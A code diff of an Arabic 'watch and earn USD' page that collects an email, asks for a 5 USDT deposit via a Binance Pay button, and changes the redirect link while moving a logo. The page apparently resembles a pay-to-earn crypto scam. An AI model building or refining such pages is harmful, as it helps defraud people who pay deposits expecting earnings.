@@ -97,16 +97,19 @@
         <div class="amount-tag">💵 قيمة الإيداع: 5.00 USDT</div>
 
         <form id="paymentForm">
-            <!-- الخطوة الأولى: كتابة الإيميل -->
+            <!-- الخطوة الأولى: بداية الدخول (تظهر فوراً للزائر) -->
             <div id="step1">
                 <div class="input-group">
                     <label for="username">البريد الإلكتروني</label>
                     <input type="text" id="username" required placeholder="example@gmail.com" style="width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                 </div>
                 <button type="button" onclick="goToStep2()" style="width: 100%; padding: 14px; background: linear-gradient(to right, #7b2cbf, #9d4edd); color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer;">متابعة إلى الإيداع</button>
+                
+                <!-- تم نقل الصورة إلى هنا لتظهر في بداية الدخول مباشرة أسفل زر المتابعة -->
+                <img src="logo.png" alt="logo" class="bottom-logo">
             </div>
 
-            <!-- الخطوة الثانية: خيارات الإيداع -->
+            <!-- الخطوة الثانية: خيارات الإيداع (تظهر بعد الضغط على الزر) -->
             <div id="step2" style="display: none; margin-top: 15px;">
                 <button type="button" onclick="redirectToNewBinance()" style="width: 100%; padding: 14px; background: #f3ba2f; color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
                     <span>إيداع سريع عبر Binance Pay</span>
@@ -119,9 +122,6 @@
                 </div>
             </div>
         </form>
-
-        <!-- الصورة الشفافة تظهر هنا دائماً في الواجهة الأولى وأسفل الخطوات -->
-        <img src="logo.png" alt="logo" class="bottom-logo">
 
         <div class="footer-text">WATCH AND EARN USD</div>
     </div>
@@ -143,7 +143,7 @@
         button.disabled = true;
         
         setTimeout(() => {
-            window.location.href = "https://s.binance.com/vKDiZNoi";
+            window.location.href = "https://binance.com";
         }, 1000);
     }
 
